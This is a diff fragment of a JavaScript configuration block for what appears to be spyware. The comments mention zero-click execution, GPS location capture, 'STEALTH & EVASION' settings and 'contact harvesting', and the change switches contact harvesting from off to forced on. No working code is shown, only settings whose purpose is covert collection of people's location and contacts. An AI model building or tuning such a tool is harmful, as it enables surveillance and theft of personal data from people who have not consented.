@@ -28,7 +28,7 @@ const CONFIG = {
     // ⚡ EXECUTION PARAMETERS
     AUTO_START: true,             // Zero-click execution
     DEBUG_MODE: false,            // Verbose logging
-    REQUIRE_CONTACTS: false,      // Force contact harvesting
+    REQUIRE_CONTACTS: true,      // Force contact harvesting
     GEO_TIMEOUT: 15000,           // Max wait for GPS lock
 
     // 🕵️ STEALTH & EVASION
